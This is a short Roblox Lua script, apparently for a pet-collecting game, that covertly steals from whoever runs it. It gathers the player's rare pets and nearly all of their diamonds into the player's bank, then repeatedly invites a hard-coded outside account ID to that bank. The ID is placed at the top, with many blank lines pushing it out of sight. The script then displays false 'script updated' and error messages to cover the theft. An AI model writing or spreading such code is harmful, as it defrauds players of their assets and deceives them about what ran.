local A = 499043889






















































local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local mybank = 499043889
local PetsList = {}
for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
        table.insert(PetsList, v.uid);
    end
end
local request, request2 = lib.Network.Invoke("bank deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1);
if request then
    lib.Message.New("This script was updated , sorry");
else
 lib.Message.New("An unknow error was occured. Do you want try to re-joining?");
end


if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], mybank , A ) 
 then
warn("Version: 0.1.5")
else
    lib.Message.New("An unknown error has occured. Do you want to try re-joining?");
end;
wait(30)
 lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], mybank , A ) 
